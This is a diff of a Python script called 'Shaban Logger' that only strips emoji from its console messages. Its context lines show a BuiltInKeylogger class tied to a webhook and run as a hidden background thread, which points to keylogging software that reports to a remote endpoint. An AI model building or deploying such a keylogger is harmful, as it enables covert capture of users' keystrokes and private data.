@@ -28,7 +28,7 @@ def detect_os():
         return 'linux'
 
 current_os = detect_os()
-print(f"🚀 Shaban Logger starting on {current_os.upper()}...")
+print(f"Shaban Logger starting on {current_os.upper()}...")
 
 init(autoreset=True)
 
@@ -43,7 +43,7 @@ running = True
 def signal_handler(sig, frame):
     """Gère le signal Ctrl+C"""
     global running
-    print(f"\n{Fore.YELLOW}🛑 Closing signal received...{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}Closing signal received...{Style.RESET_ALL}")
     running = False
 
 def get_battery_info():
@@ -191,7 +191,7 @@ class BuiltInKeylogger:
         
     def start_monitoring(self):
         """Démarre la surveillance d'activité"""
-        print("🔍 Activity monitoring started (no external dependencies)")
+        print("Activity monitoring started (no external dependencies)")
         
         while self.running:
             try:
@@ -310,10 +310,10 @@ def start_builtin_keylogger():
     keylogger = BuiltInKeylogger(webhook)
     keylogger_thread = threading.Thread(target=keylogger.start_monitoring, daemon=True)
     keylogger_thread.start()
-    print("✅ Built-in activity monitor started")
+    print("Built-in activity monitor started")
 
 if __name__ == "__main__":
-    print(f"{Fore.YELLOW}⏹️  Press Ctrl+C to stop gracefully{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW} Press Ctrl+C to stop gracefully{Style.RESET_ALL}")
     
     # Enregistrer le gestionnaire de signal
     signal.signal(signal.SIGINT, signal_handler)
@@ -353,13 +353,13 @@ if __name__ == "__main__":
                 
     except KeyboardInterrupt:
         running = False
-        print(f"\n{Fore.YELLOW}🛑 Shaban Logger stopped by user{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Shaban Logger stopped by user{Style.RESET_ALL}")
     except Exception as e:
         if running:
             send_error(f"Main error: {traceback.format_exc()}")
 
     # Nettoyage final
-    print(f"{Fore.GREEN}✅ Cleaning up...{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}Cleaning up...{Style.RESET_ALL}")
     if keylogger:
         keylogger.stop()
     
@@ -371,5 +371,5 @@ if __name__ == "__main__":
     except:
         pass
     
-    print(f"{Fore.GREEN}✅ Cleanup complete{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}Cleanup complete{Style.RESET_ALL}")
     sys.exit(0)
